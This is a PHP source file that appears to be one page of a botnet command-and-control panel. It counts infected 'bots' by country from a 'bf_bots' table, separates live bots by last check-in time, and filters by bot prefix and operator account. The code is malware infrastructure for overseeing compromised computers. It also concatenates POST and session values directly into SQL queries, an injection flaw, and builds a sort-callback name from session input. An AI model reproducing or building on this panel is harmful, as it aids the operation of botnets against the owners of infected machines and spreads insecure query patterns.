<?php
get_function('html_pages');
include_once('modules/bots/country_code.php');

$list = array();
$counts = array();

$counts['live'] = 0;

if(isset($_POST['prefix'])) $_SESSION['search']['prefix'] = $_POST['prefix'];
if(isset($_POST['sort'])) $_SESSION['search']['sort'] = $_POST['sort'];

function counts_all($row){
	global $list, $counts, $country_code;
	$list[$row->country]['code'] = $row->country;
	$list[$row->country]['name'] = $country_code[$row->country];
	$counts['all'] += $row->count;
	$list[$row->country]['count'] = $row->count;
	$list[$row->country]['live'] = 0;
}

function counts_live($row){
	global $list, $counts;
	if(isset($list[$row->country])){
		$counts['live'] += $row->count;
		$list[$row->country]['live']= $row->count;
	}
}

function sort_list_country1($a, $b){
	$a_key = substr(strtolower($a['name']), 0, 1);
	$b_key = substr(strtolower($b['name']), 0, 1);
	if ($a_key == $b_key) {
        return 0;
    }

    $tmp = array();
    $tmp[0] = $a_key;
    $tmp[1] = $b_key;
    sort($tmp, SORT_STRING);
    if($tmp[0] == $a_key){
    	return -1;
    }else{
    	return 1;
    }
}

function sort_list_country2($a, $b){
	$a_key = substr(strtolower($a['name']), 0, 1);
	$b_key = substr(strtolower($b['name']), 0, 1);
	if ($a_key == $b_key) {
        return 0;
    }

    $tmp = array();
    $tmp[0] = $a_key;
    $tmp[1] = $b_key;
    sort($tmp, SORT_STRING);
    if($tmp[0] == $a_key){
    	return 1;
    }else{
    	return -1;
    }
}

function sort_list_alls1($a, $b){
	if ($a['count'] == $b['count']) {
        return 0;
    }

    if ($a['count'] < $b['count']) {
        return -1;
    }else{
    	return 1;
    }
}

function sort_list_alls2($a, $b){
	if ($a['count'] == $b['count']) {
        return 0;
    }

    if ($a['count'] < $b['count']) {
        return 1;
    }else{
    	return -1;
    }
}

function sort_list_lives1($a, $b){
	if ($a['live'] == $b['live']) {
        return 0;
    }

    if ($a['live'] < $b['live']) {
        return -1;
    }else{
    	return 1;
    }
}

function sort_list_lives2($a, $b){
	if ($a['live'] == $b['live']) {
        return 0;
    }

    if ($a['live'] < $b['live']) {
        return 1;
    }else{
    	return -1;
    }
}

if($_SESSION['user']->config['hunter_limit'] == true){
	$post_id = $_SESSION['user']->id;
}else{
	$post_id = '';
}

if(empty($_SESSION['user']->config['prefix'])){
	if(!empty($_SESSION['search']['prefix'])){
		$mysqli->query('SELECT DISTINCT(country) country, COUNT(country) count FROM bf_bots WHERE (prefix = \''.$_SESSION['search']['prefix'].'\') '.(!empty($post_id)?' AND (post_id = \''.$post_id.'\') ':'').' GROUP by country LIMIT ' . (($Cur['page'] == 0) ? $_SESSION['user']->config['cp']['bots'] : $Cur['page']*$_SESSION['user']->config['cp']['bots'] . ',' . $_SESSION['user']->config['cp']['bots']), null, 'counts_all', false);
		$mysqli->query('SELECT DISTINCT(country) country, COUNT(country) count FROM bf_bots WHERE (prefix = \''.$_SESSION['search']['prefix'].'\') AND (last_date > \''.(time()-($config['live']*60)).'\') '.(!empty($post_id)?' AND (post_id = \''.$post_id.'\') ':'').' GROUP by country', null, 'counts_live', false);
	}else{
		$mysqli->query('SELECT DISTINCT(country) country, COUNT(country) count FROM bf_bots '.(!empty($post_id)?' WHERE (post_id = \''.$post_id.'\') ':'').' GROUP by country LIMIT ' . (($Cur['page'] == 0) ? $_SESSION['user']->config['cp']['bots'] : $Cur['page']*$_SESSION['user']->config['cp']['bots'] . ',' . $_SESSION['user']->config['cp']['bots']), null, 'counts_all', false);
		$mysqli->query('SELECT DISTINCT(country) country, COUNT(country) count FROM bf_bots WHERE (last_date > \''.(time()-($config['live']*60)).'\') '.(!empty($post_id)?' AND (post_id = \''.$post_id.'\') ':'').' GROUP by country', null, 'counts_live', false);
	}
}else{
	$mysqli->query('SELECT DISTINCT(country) country, COUNT(country) count FROM bf_bots WHERE (prefix = \''.$_SESSION['user']->config['prefix'].'\') '.(!empty($post_id)?' AND (post_id = \''.$post_id.'\') ':'').' GROUP by country LIMIT ' . (($Cur['page'] == 0) ? $_SESSION['user']->config['cp']['bots'] : $Cur['page']*$_SESSION['user']->config['cp']['bots'] . ',' . $_SESSION['user']->config['cp']['bots']), null, 'counts_all', false);
	$mysqli->query('SELECT DISTINCT(country) country, COUNT(country) count FROM bf_bots WHERE (prefix = \''.$_SESSION['user']->config['prefix'].'\') AND (last_date > \''.(time()-($config['live']*60)).'\') '.(!empty($post_id)?' AND (post_id = \''.$post_id.'\') ':'').' GROUP by country', null, 'counts_live', false);
}

$list_count = count($list);

if($_SESSION['user']->config['cp']['bots'] >= $list_count){
	if(empty($_SESSION['user']->config['prefix'])){
		if(!empty($_SESSION['search']['prefix'])){
			$counts['alls'] = $mysqli->query_name('SELECT COUNT(DISTINCT(country)) count FROM bf_bots WHERE (prefix = \''.$_SESSION['search']['prefix'].'\') '.(!empty($post_id)?' AND (post_id = \''.$post_id.'\') ':''), null, 'count', 0, 60);
			$counts['allz'] = $mysqli->query_name('SELECT COUNT(id) count FROM bf_bots WHERE (prefix = \''.$_SESSION['search']['prefix'].'\') '.(!empty($post_id)?' AND (post_id = \''.$post_id.'\') ':''), null, 'count', 0, 60);
			$counts['livez'] = $mysqli->query_name('SELECT COUNT(id) count FROM bf_bots WHERE (last_date > \''.(time()-($config['live']*60)).'\') AND (prefix = \''.$_SESSION['search']['prefix'].'\') '.(!empty($post_id)?' AND (post_id = \''.$post_id.'\') ':''));
		}else{
			$counts['alls'] = $mysqli->query_name('SELECT COUNT(DISTINCT(country)) count FROM bf_bots '.(!empty($post_id)?' WHERE (post_id = \''.$post_id.'\') ':''), null, 'count', 0, 60);
			$counts['allz'] = $mysqli->query_name('SELECT COUNT(country) count FROM bf_bots '.(!empty($post_id)?' WHERE (post_id = \''.$post_id.'\') ':''), null, 'count', 0, 60);
			$counts['livez'] = $mysqli->query_name('SELECT COUNT(country) count FROM bf_bots WHERE (last_date > \''.(time()-($config['live']*60)).'\') '.(!empty($post_id)?' AND (post_id = \''.$post_id.'\') ':''));
		}
	}else{
		$counts['alls'] = $mysqli->query_name('SELECT COUNT(DISTINCT(country)) count FROM bf_bots WHERE (prefix = \''.$_SESSION['user']->config['prefix'].'\') '.(!empty($post_id)?' AND (post_id = \''.$post_id.'\') ':''), null, 'count', 0, 60);
		$counts['allz'] = $mysqli->query_name('SELECT COUNT(country) count FROM bf_bots WHERE (prefix = \''.$_SESSION['user']->config['prefix'].'\') '.(!empty($post_id)?' AND (post_id = \''.$post_id.'\') ':''), null, 'count', 0, 60);
		$counts['livez'] = $mysqli->query_name('SELECT COUNT(country) count FROM bf_bots WHERE (last_date > \''.(time()-($config['live']*60)).'\') AND (prefix = \''.$_SESSION['user']->config['prefix'].'\') '.(!empty($post_id)?' AND (post_id = \''.$post_id.'\') ':''));
	}
}else{
	if(empty($_SESSION['user']->config['prefix'])){
		if(!empty($_SESSION['search']['prefix'])){
			$counts['alls'] = $list_count;
			$counts['allz'] = $mysqli->query_name('SELECT COUNT(id) count FROM bf_bots WHERE (prefix = \''.$_SESSION['search']['prefix'].'\') '.(!empty($post_id)?' AND (post_id = \''.$post_id.'\') ':''), null, 'count', 0, 60);
			$counts['livez'] = $mysqli->query_name('SELECT COUNT(id) count FROM bf_bots WHERE (last_date > \''.(time()-($config['live']*60)).'\') AND (prefix = \''.$_SESSION['search']['prefix'].'\') '.(!empty($post_id)?' AND (post_id = \''.$post_id.'\') ':''));
		}else{
			$counts['alls'] = $list_count;
			$counts['allz'] = $mysqli->query_name('SELECT COUNT(country) count FROM bf_bots '.(!empty($post_id)?' WHERE (post_id = \''.$post_id.'\') ':''), null, 'count', 0, 60);
			$counts['livez'] = $mysqli->query_name('SELECT COUNT(country) count FROM bf_bots WHERE (last_date > \''.(time()-($config['live']*60)).'\') '.(!empty($post_id)?' AND (post_id = \''.$post_id.'\') ':''));
		}
	}else{
		$counts['alls'] = $list_count;
		$counts['allz'] = $mysqli->query_name('SELECT COUNT(country) count FROM bf_bots WHERE (prefix = \''.$_SESSION['user']->config['prefix'].'\') '.(!empty($post_id)?' AND (post_id = \''.$post_id.'\') ':''), null, 'count', 0, 60);
		$counts['livez'] = $mysqli->query_name('SELECT COUNT(country) count FROM bf_bots WHERE (last_date > \''.(time()-($config['live']*60)).'\') AND (prefix = \''.$_SESSION['user']->config['prefix'].'\') '.(!empty($post_id)?' AND (post_id = \''.$post_id.'\') ':''));
	}
}

if(!empty($_SESSION['search']['sort'])){
	@usort($list, 'sort_list_' . $_SESSION['search']['sort']);
}

$smarty->assign('list', $list);
$smarty->assign('counts', $counts);
$smarty->assign('pages', html_pages('/bots/?', $counts['alls'], $_SESSION['user']->config['cp']['bots'], 1, 'bots_list_country', 'this.href'));
//$smarty->assign("prefix", $mysqli->query('SELECT prefix FROM bf_bots GROUP by prefix', null, null, false));
$prefix = scandir('cache/prefix/', false);
unset($prefix[0], $prefix[1]);
$smarty->assign("prefix", $prefix);
$smarty->assign('title', $lang['bots'] . ' - ' . $lang['blc']);

if($Cur['ajax'] == 1){
	print('<script type="text/javascript" language="javascript">document.title = \''.$smarty->tpl_vars['title']->value.'\';</script>');
}

$smarty->assign('javascript_end', '<script type="text/javascript" src="/images/ampie/swfobject.js"></script>');

?>